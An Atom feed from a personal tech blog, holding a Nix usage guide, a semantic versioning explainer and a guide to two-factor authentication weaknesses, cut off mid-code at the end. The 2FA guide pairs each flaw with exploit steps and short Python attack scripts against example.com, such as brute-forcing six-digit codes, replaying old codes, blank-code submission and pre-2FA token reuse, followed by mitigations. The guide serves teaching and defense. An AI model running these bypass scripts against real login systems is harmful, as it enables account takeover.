<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ian&#39;s Archives</title>
  
  
  <link href="http://iaaaannn0.com/atom.xml" rel="self"/>
  
  <link href="http://iaaaannn0.com/"/>
  <updated>2025-02-06T19:55:35.870Z</updated>
  <id>http://iaaaannn0.com/</id>
  
  <author>
    <name>Ian</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Reproducible Builds with Nix Step by Step Guide</title>
    <link href="http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/"/>
    <id>http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/</id>
    <published>2025-02-06T19:53:33.000Z</published>
    <updated>2025-02-06T19:55:35.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Nix is a powerful package manager that provides reproducible builds, isolated environments, and efficient package management. In this guide, we’ll explore how to use Nix for package management and environment setups.</p></blockquote><h2 id="1-Installing-Software-Packages-with-Nix"><a href="#1-Installing-Software-Packages-with-Nix" class="headerlink" title="1. Installing Software Packages with Nix"></a>1. Installing Software Packages with Nix</h2><p>To install software packages, Nix uses the <code>nix-env</code> command. You can install a package with the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -i &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to install the <code>hello</code> package, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -i hello</span><br></pre></td></tr></table></figure><h2 id="2-Searching-for-Packages"><a href="#2-Searching-for-Packages" class="headerlink" title="2. Searching for Packages"></a>2. Searching for Packages</h2><p>You can search for available packages in the Nix package repository using the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -qaP &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to search for packages related to <code>hello</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -qaP hello</span><br></pre></td></tr></table></figure><p>This will list all available packages matching the name <code>hello</code>.</p><h2 id="3-Listing-Installed-Packages"><a href="#3-Listing-Installed-Packages" class="headerlink" title="3. Listing Installed Packages"></a>3. Listing Installed Packages</h2><p>To see the list of installed packages, use the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -q</span><br></pre></td></tr></table></figure><p>This will display all the currently installed packages on your system.</p><h2 id="4-Upgrading-Installed-Packages"><a href="#4-Upgrading-Installed-Packages" class="headerlink" title="4. Upgrading Installed Packages"></a>4. Upgrading Installed Packages</h2><p>To upgrade all installed packages to their latest versions, run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -u</span><br></pre></td></tr></table></figure><p>If you want to upgrade a specific package, for example, <code>hello</code>, you can use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -u hello</span><br></pre></td></tr></table></figure><h2 id="5-Removing-Packages"><a href="#5-Removing-Packages" class="headerlink" title="5. Removing Packages"></a>5. Removing Packages</h2><p>If you no longer need a particular package, you can uninstall it using the <code>nix-env</code> command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -e &lt;package-name&gt;</span><br></pre></td></tr></table></figure><p>For example, to uninstall <code>hello</code>, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-env -e hello</span><br></pre></td></tr></table></figure><h2 id="6-Using-nix-shell-for-Isolated-Environments"><a href="#6-Using-nix-shell-for-Isolated-Environments" class="headerlink" title="6. Using nix-shell for Isolated Environments"></a>6. Using <code>nix-shell</code> for Isolated Environments</h2><p>Nix provides <code>nix-shell</code>, which allows you to enter an isolated environment with specific dependencies. You can create a <code>shell.nix</code> file to define the environment for a project. Here’s an example of a <code>shell.nix</code> file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># shell.nix</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;hello-env&quot;;</span><br><span class="line">  buildInputs = [ hello ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once the <code>shell.nix</code> file is defined, enter the environment by running:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nix-shell</span><br></pre></td></tr></table></figure><p>This will create a shell environment where the <code>hello</code> package and its dependencies are available.</p><h2 id="7-Nix-Configuration-Files"><a href="#7-Nix-Configuration-Files" class="headerlink" title="7. Nix Configuration Files"></a>7. Nix Configuration Files</h2><p>In Nix, you can use configuration files to manage dependencies and software installation. Here’s an example of how to define a configuration in a Nix file. You can create a configuration file (e.g., <code>default.nix</code>) that specifies the packages to be installed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># default.nix</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;my-environment&quot;;</span><br><span class="line">  buildInputs = [ vim hello ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Commenting-in-Nix-Configuration-Files"><a href="#Commenting-in-Nix-Configuration-Files" class="headerlink" title="Commenting in Nix Configuration Files"></a>Commenting in Nix Configuration Files</h3><p>Nix allows you to add comments to your configuration files for clarity. Use <code>#</code> to add a comment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># This is a simple Nix configuration file</span><br><span class="line">with import &lt;nixpkgs&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">stdenv.mkDerivation &#123;</span><br><span class="line">  name = &quot;my-environment&quot;;</span><br><span class="line">  buildInputs = [ vim hello ]; # Install vim and hello package</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this example:</p><ul><li><code>with import &lt;nixpkgs&gt;</code>: Imports the Nix Packages collection.</li><li><code>stdenv.mkDerivation</code>: Creates a custom environment.</li><li><code>buildInputs</code>: Specifies which packages (like <code>vim</code> and <code>hello</code>) to include in the environment.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Nix is a powerful package manager that provides reproducible builds, isolated environments, and efficient package management</summary>
      
    
    
    
    
    <category term="nix" scheme="http://iaaaannn0.com/tags/nix/"/>
    
  </entry>
  
  <entry>
    <title>Semantic Versioning for GitHub Releases</title>
    <link href="http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/"/>
    <id>http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/</id>
    <published>2025-02-05T19:23:00.000Z</published>
    <updated>2025-02-05T19:25:10.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="What-is-Semantic-Versioning-SemVer"><a href="#What-is-Semantic-Versioning-SemVer" class="headerlink" title="What is Semantic Versioning (SemVer)?"></a><strong>What is Semantic Versioning (SemVer)?</strong></h2><p>Semantic Versioning (SemVer) is a widely adopted standard for naming software versions. It follows this format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAJOR.MINOR.PATCH</span><br></pre></td></tr></table></figure><p>For example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1.0.0</span><br></pre></td></tr></table></figure><p>Each part of the version number has a specific meaning:</p><ul><li><strong>MAJOR:</strong> Significant changes that break backward compatibility.</li><li><strong>MINOR:</strong> New features that are backward compatible.</li><li><strong>PATCH:</strong> Bug fixes and small improvements that do not change functionality.</li></ul><h3 id="Examples-of-Stable-Releases"><a href="#Examples-of-Stable-Releases" class="headerlink" title="Examples of Stable Releases:"></a><strong>Examples of Stable Releases:</strong></h3><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0</code></td><td>First stable release</td></tr><tr><td><code>v1.1.0</code></td><td>Adds new features, backward compatible</td></tr><tr><td><code>v1.1.1</code></td><td>Bug fix release, backward compatible</td></tr><tr><td><code>v2.0.0</code></td><td>Breaking changes introduced</td></tr></tbody></table><h2 id="Pre-release-Versions-Testing-Versions"><a href="#Pre-release-Versions-Testing-Versions" class="headerlink" title="Pre-release Versions (Testing Versions)"></a><strong>Pre-release Versions (Testing Versions)</strong></h2><p>Before an official stable release, you may want to publish a <strong>pre-release version</strong> for testing purposes. These versions contain experimental features or improvements that need validation.</p><h3 id="Naming-Format-for-Pre-release-Versions"><a href="#Naming-Format-for-Pre-release-Versions" class="headerlink" title="Naming Format for Pre-release Versions:"></a><strong>Naming Format for Pre-release Versions:</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAJOR.MINOR.PATCH-identifier.version</span><br></pre></td></tr></table></figure><table><thead><tr><th>Identifier</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-alpha</code></td><td>Internal testing version (unstable)</td></tr><tr><td><code>-beta</code></td><td>Public testing version (feature-complete but may contain bugs)</td></tr><tr><td><code>-rc</code></td><td>Release Candidate (nearly stable, final testing)</td></tr><tr><td><code>-snapshot</code></td><td>Nightly or in-development snapshot</td></tr></tbody></table><h3 id="Examples-of-Pre-release-Versions"><a href="#Examples-of-Pre-release-Versions" class="headerlink" title="Examples of Pre-release Versions:"></a><strong>Examples of Pre-release Versions:</strong></h3><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0-alpha.1</code></td><td>First alpha version (internal testing)</td></tr><tr><td><code>v1.0.0-beta.2</code></td><td>Second beta version (public testing)</td></tr><tr><td><code>v1.0.0-rc.1</code></td><td>First release candidate</td></tr><tr><td><code>v1.0.0</code></td><td>Final stable version</td></tr></tbody></table><hr><h2 id="Other-Naming-Conventions"><a href="#Other-Naming-Conventions" class="headerlink" title="Other Naming Conventions"></a><strong>Other Naming Conventions</strong></h2><p>In some cases, you might want to add metadata or build information to the version number.</p><table><thead><tr><th>Version</th><th>Description</th></tr></thead><tbody><tr><td><code>v1.0.0+build20240205</code></td><td>Includes build metadata (doesn’t affect version sorting)</td></tr><tr><td><code>v1.0.0-dev</code></td><td>Development version</td></tr><tr><td><code>v1.0.0-nightly</code></td><td>Nightly build version</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;What-is-Semantic-Versioning-SemVer&quot;&gt;&lt;a href=&quot;#What-is-Semantic-Versioning-SemVer&quot; class=&quot;headerlink&quot; title=&quot;What is Semantic Version</summary>
      
    
    
    
    
    <category term="releases" scheme="http://iaaaannn0.com/tags/releases/"/>
    
  </entry>
  
  <entry>
    <title>From Setup to Exploitation - A Comprehensive Guide to 2FA Weaknesses</title>
    <link href="http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/"/>
    <id>http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/</id>
    <published>2025-02-05T12:17:16.000Z</published>
    <updated>2025-02-05T12:30:17.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description-of-2FA-Vulnerabilities"><a href="#Description-of-2FA-Vulnerabilities" class="headerlink" title="Description of 2FA Vulnerabilities"></a>Description of 2FA Vulnerabilities</h2><p>Two-Factor Authentication (2FA) is a critical security feature used to provide an additional layer of protection beyond a username and password. However, vulnerabilities in the implementation, setup, or management of 2FA can undermine its effectiveness.</p><h3 id="2FA-Setup-Implementation"><a href="#2FA-Setup-Implementation" class="headerlink" title="2FA Setup&#x2F;Implementation"></a>2FA Setup&#x2F;Implementation</h3><h4 id="1-2FA-Secret-Cannot-Be-Rotated"><a href="#1-2FA-Secret-Cannot-Be-Rotated" class="headerlink" title="1. 2FA Secret Cannot Be Rotated"></a><strong>1. 2FA Secret Cannot Be Rotated</strong></h4><p>In many systems, once a 2FA secret (e.g., a key or QR code) is generated, it cannot be rotated or updated. This becomes a problem if the secret is ever exposed, as it leaves the account permanently vulnerable.</p><p><strong>Impact:</strong> If the 2FA secret is compromised, the attacker gains long-term access without the user being able to recover.</p><p><strong>Solution:</strong> Always provide users with the option to securely rotate their 2FA secret. Implement a mechanism to invalidate old secrets and ensure the new one is immediately effective.</p><hr><h4 id="2-2FA-Secret-Remains-Obtainable-After-2FA-Is-Enabled"><a href="#2-2FA-Secret-Remains-Obtainable-After-2FA-Is-Enabled" class="headerlink" title="2. 2FA Secret Remains Obtainable After 2FA Is Enabled"></a><strong>2. 2FA Secret Remains Obtainable After 2FA Is Enabled</strong></h4><p>A common issue is leaving the 2FA secret accessible after the initial setup. If a user’s QR code or secret key is stored insecurely or remains visible in the user interface, attackers can retrieve it even after 2FA has been enabled.</p><p><strong>Impact:</strong> This allows an attacker to bypass 2FA protections by using the exposed secret.</p><p><strong>Solution:</strong> Remove or obfuscate the 2FA secret immediately after it is set up. Ensure secrets are never logged, stored in plaintext, or exposed in server responses.</p><hr><h4 id="3-Logic-Bugs-in-2FA-Setup"><a href="#3-Logic-Bugs-in-2FA-Setup" class="headerlink" title="3. Logic Bugs in 2FA Setup"></a><strong>3. Logic Bugs in 2FA Setup</strong></h4><p>Poorly designed logic in the 2FA setup process can cause unintended consequences, such as locking users out of their accounts or corrupting existing authentication settings. For example, systems that allow enabling 2FA without proper state validation can create inconsistencies.</p><p><strong>Impact:</strong> Logic errors can cause account damage or allow attackers to exploit weak points in the setup process.</p><p><strong>Solution:</strong> Thoroughly test the 2FA setup process for edge cases, such as interrupted sessions, invalid requests, and duplicated operations. Use state validation mechanisms to prevent unintended behavior.</p><hr><h4 id="4-Previously-Created-Sessions-Remain-Valid-After-2FA-Activation"><a href="#4-Previously-Created-Sessions-Remain-Valid-After-2FA-Activation" class="headerlink" title="4. Previously Created Sessions Remain Valid After 2FA Activation"></a><strong>4. Previously Created Sessions Remain Valid After 2FA Activation</strong></h4><p>When a user enables 2FA, all active sessions should be invalidated. However, many systems fail to do this, leaving old sessions operational. This can allow attackers with access to an existing session to bypass the new 2FA requirement.</p><p><strong>Impact:</strong> Attackers with access to an active session can continue to operate without being prompted for 2FA.</p><p><strong>Solution:</strong> Automatically terminate all active sessions when 2FA is enabled. Notify users of the session termination and give them control over managing active sessions.</p><hr><h4 id="5-Enabling-2FA-Without-Email-Verification"><a href="#5-Enabling-2FA-Without-Email-Verification" class="headerlink" title="5. Enabling 2FA Without Email Verification"></a><strong>5. Enabling 2FA Without Email Verification</strong></h4><p>Some systems allow users to enable 2FA without verifying their email or identity. This is problematic because attackers who have gained access to an account could enable and misuse 2FA, making it difficult for the legitimate user to regain control.</p><p><strong>Impact:</strong> Attackers can establish control over an account’s 2FA without proper verification, locking out the legitimate user.</p><p><strong>Solution:</strong> Enforce email or identity verification before allowing users to enable 2FA. This ensures only authorized users can modify security settings.</p><hr><h4 id="6-IDOR-Vulnerabilities-Leading-to-Account-Takeover"><a href="#6-IDOR-Vulnerabilities-Leading-to-Account-Takeover" class="headerlink" title="6. IDOR Vulnerabilities Leading to Account Takeover"></a><strong>6. IDOR Vulnerabilities Leading to Account Takeover</strong></h4><p>Insecure Direct Object References (IDOR) in 2FA-related endpoints can be exploited to modify or access another user’s 2FA settings. For example, attackers could manipulate API requests to enable or disable 2FA for other accounts.</p><p><strong>Impact:</strong> Attackers can take over accounts by altering 2FA settings without authorization.</p><p><strong>Solution:</strong> Implement robust access control mechanisms for all 2FA-related API endpoints. Use user-specific identifiers bound to sessions and validate all requests server-side.</p><h3 id="2FA-Bypass-Vulnerabilities-Detailed-Steps-and-Examples"><a href="#2FA-Bypass-Vulnerabilities-Detailed-Steps-and-Examples" class="headerlink" title="2FA Bypass Vulnerabilities: Detailed Steps and Examples"></a>2FA Bypass Vulnerabilities: Detailed Steps and Examples</h3><h4 id="1-2FA-Code-Leakage-in-Responses"><a href="#1-2FA-Code-Leakage-in-Responses" class="headerlink" title="1. 2FA Code Leakage in Responses"></a><strong>1. 2FA Code Leakage in Responses</strong></h4><p>If 2FA codes are sent in responses from the server to the client, attackers can intercept them using tools like proxies (e.g., Burp Suite) or by monitoring logs.</p><p><strong>Exploit Steps:</strong></p><ol><li>Initiate a 2FA login request.</li><li>Use a proxy to inspect the server’s HTTP response.</li><li>Look for fields containing the current 2FA code in the JSON or HTML response.</li></ol><p><strong>Example Response:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;status&quot;: &quot;success&quot;,</span><br><span class="line">  &quot;2fa_code&quot;: &quot;123456&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;Verification code sent to your device.&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Attack:</strong> By capturing the <code>2fa_code</code> field, an attacker can bypass the need for real-time code input.</p><p><strong>Mitigation:</strong></p><ul><li>Never send 2FA codes or sensitive information in server responses.</li><li>Use one-time codes that are validated server-side without revealing them to the client.</li></ul><h4 id="2-Reusing-Old-2FA-Codes"><a href="#2-Reusing-Old-2FA-Codes" class="headerlink" title="2. Reusing Old 2FA Codes"></a><strong>2. Reusing Old 2FA Codes</strong></h4><p>If old 2FA codes are not invalidated after generating a new one, attackers can reuse previously intercepted codes.</p><p><strong>Exploit Steps:</strong></p><ol><li>Capture a valid 2FA code during a login session.</li><li>Generate a new 2FA code (e.g., by triggering another login attempt).</li><li>Use the previously captured code instead of the latest one.</li></ol><p><strong>Example Exploit Code:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Simulate login</span><br><span class="line">login_payload = &#123;&quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;</span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.post(&quot;https://example.com/login&quot;, data=login_payload)</span><br><span class="line"></span><br><span class="line"># Use old code</span><br><span class="line">bypass_payload = &#123;&quot;2fa_code&quot;: &quot;123456&quot;&#125;  # Old captured code</span><br><span class="line">bypass_response = session.post(&quot;https://example.com/verify-2fa&quot;, data=bypass_payload)</span><br><span class="line"></span><br><span class="line">print(bypass_response.status_code)  # Should return 200 if bypassed</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Immediately invalidate old codes when new codes are generated.</li><li>Use nonce-based validation to ensure that only the most recent code is valid.</li></ul><h4 id="3-Lack-of-Rate-Limiting-Brute-Force-Attack"><a href="#3-Lack-of-Rate-Limiting-Brute-Force-Attack" class="headerlink" title="3. Lack of Rate-Limiting (Brute-Force Attack)"></a><strong>3. Lack of Rate-Limiting (Brute-Force Attack)</strong></h4><p>Without rate limits, attackers can brute-force 2FA codes by rapidly trying all possible combinations (e.g., <code>000000</code> to <code>999999</code>).</p><p><strong>Exploit Steps:</strong></p><ol><li>Write a script to automate code guessing.</li><li>Continuously send requests until the correct code is found.</li></ol><p><strong>Example Attack Script:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;https://example.com/verify-2fa&quot;</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line"></span><br><span class="line">for code in range(1000000):  # 6-digit codes</span><br><span class="line">    payload = &#123;&quot;2fa_code&quot;: f&quot;&#123;code:06&#125;&quot;&#125;</span><br><span class="line">    response = requests.post(url, data=payload, headers=headers)</span><br><span class="line"></span><br><span class="line">    if response.status_code == 200:  # Success</span><br><span class="line">        print(f&quot;Code found: &#123;code:06&#125;&quot;)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Enforce rate-limiting (e.g., 5 attempts per minute per IP).</li><li>Introduce account lockouts or CAPTCHA after repeated failures.</li></ul><h4 id="4-Bypassing-2FA-with-Null-or-Blank-Values"><a href="#4-Bypassing-2FA-with-Null-or-Blank-Values" class="headerlink" title="4. Bypassing 2FA with Null or Blank Values"></a><strong>4. Bypassing 2FA with Null or Blank Values</strong></h4><p>Some systems improperly validate 2FA codes, allowing null or blank values to bypass authentication.</p><p><strong>Exploit Steps:</strong></p><ol><li>Attempt to submit an empty or invalid <code>2fa_code</code> field.</li><li>Check if authentication succeeds despite no valid code.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#123;&quot;2fa_code&quot;: &quot;&quot;&#125;</span><br><span class="line">response = requests.post(&quot;https://example.com/verify-2fa&quot;, data=payload)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates successful bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Validate input server-side to reject null, empty, or default values.</li><li>Use strict validation checks for format and length (e.g., exactly 6 digits).</li></ul><h4 id="5-Misconfigured-Session-Permissions"><a href="#5-Misconfigured-Session-Permissions" class="headerlink" title="5. Misconfigured Session Permissions"></a><strong>5. Misconfigured Session Permissions</strong></h4><p>If session management is not properly configured, attackers may bypass 2FA by directly accessing authenticated endpoints without completing 2FA verification.</p><p><strong>Exploit Steps:</strong></p><ol><li>Intercept the session token after login but before 2FA verification.</li><li>Use the session token to access authenticated endpoints.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Assume session token is captured before 2FA</span><br><span class="line">session_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;</span><br><span class="line"></span><br><span class="line"># Access a protected endpoint</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;session_token&#125;&quot;&#125;</span><br><span class="line">response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Mark sessions as “partial” until 2FA is completed.</li><li>Restrict access to sensitive endpoints until full authentication is confirmed.</li></ul><h4 id="6-Referrer-Check-Bypass-with-Direct-Requests"><a href="#6-Referrer-Check-Bypass-with-Direct-Requests" class="headerlink" title="6. Referrer Check Bypass with Direct Requests"></a><strong>6. Referrer Check Bypass with Direct Requests</strong></h4><p>If 2FA verification relies on referrer headers, attackers can bypass these checks by crafting direct requests.</p><p><strong>Exploit Steps:</strong></p><ol><li>Inspect network traffic for referrer-based verification.</li><li>Send a crafted HTTP request without the expected referrer.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;&quot;Referer&quot;: &quot;https://example.com/legitimate-page&quot;&#125;</span><br><span class="line">response = requests.post(&quot;https://example.com/verify-2fa&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # Should bypass referrer-based restrictions</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Avoid relying solely on referrer headers for verification.</li><li>Use session-bound tokens or other mechanisms to validate request authenticity.</li></ul><h4 id="7-Using-OAuth-for-2FA-Bypass"><a href="#7-Using-OAuth-for-2FA-Bypass" class="headerlink" title="7. Using OAuth for 2FA Bypass"></a><strong>7. Using OAuth for 2FA Bypass</strong></h4><p>If 2FA integration with OAuth is poorly configured, attackers can exploit token exchange mechanisms to bypass 2FA.</p><p><strong>Exploit Steps:</strong></p><ol><li>Exploit a misconfigured OAuth endpoint to request access tokens without completing 2FA.</li><li>Use the token to authenticate directly.</li></ol><p><strong>Example Exploit:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Request token from misconfigured endpoint</span><br><span class="line">token_response = requests.post(&quot;https://example.com/oauth/token&quot;, data=&#123;&quot;grant_type&quot;: &quot;password&quot;, &quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;)</span><br><span class="line"></span><br><span class="line">access_token = token_response.json().get(&quot;access_token&quot;)</span><br><span class="line"></span><br><span class="line"># Use the token to bypass 2FA</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;access_token&#125;&quot;&#125;</span><br><span class="line">response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Require 2FA completion before issuing access tokens.</li><li>Validate tokens for proper authentication scope and origin.</li></ul><h3 id="Additional-Vulnerabilities-in-2FA-Disabling"><a href="#Additional-Vulnerabilities-in-2FA-Disabling" class="headerlink" title="Additional Vulnerabilities in 2FA Disabling"></a><strong>Additional Vulnerabilities in 2FA Disabling</strong></h3><h4 id="1-Lack-of-Log-Auditing"><a href="#1-Lack-of-Log-Auditing" class="headerlink" title="1. Lack of Log Auditing"></a><strong>1. Lack of Log Auditing</strong></h4><p>If 2FA enable&#x2F;disable actions are not logged properly, attackers can disable 2FA without detection, leaving the user and administrators unaware of the breach.</p><p><strong>Impact:</strong> Attackers can disable 2FA stealthily, making accounts vulnerable.</p><p><strong>Mitigation:</strong></p><ul><li>Log all 2FA-related actions, including enabling, disabling, and failed attempts.</li><li>Include details like timestamps, IP addresses, and user-agent strings in the logs.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def disable_2fa(user_id):</span><br><span class="line">    # Perform the 2FA disabling logic</span><br><span class="line">    perform_disable_2fa(user_id)</span><br><span class="line">    </span><br><span class="line">    # Log the action</span><br><span class="line">    log_action(</span><br><span class="line">        user_id=user_id,</span><br><span class="line">        action=&quot;2FA Disabled&quot;,</span><br><span class="line">        ip_address=get_client_ip(),</span><br><span class="line">        user_agent=get_user_agent(),</span><br><span class="line">        timestamp=get_current_timestamp()</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><hr><h4 id="2-Weak-Backup-Code-Security"><a href="#2-Weak-Backup-Code-Security" class="headerlink" title="2. Weak Backup Code Security"></a><strong>2. Weak Backup Code Security</strong></h4><p>Backup codes are often provided for account recovery if the primary 2FA device is unavailable. If these codes are predictable, insufficiently long, or not invalidated after use, attackers can exploit them.</p><p><strong>Impact:</strong> Attackers can guess or steal backup codes to disable 2FA.</p><p><strong>Mitigation:</strong></p><ul><li>Generate backup codes with sufficient complexity (e.g., random alphanumeric strings).</li><li>Automatically invalidate used codes.</li><li>Require additional verification (e.g., password input) to use backup codes.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 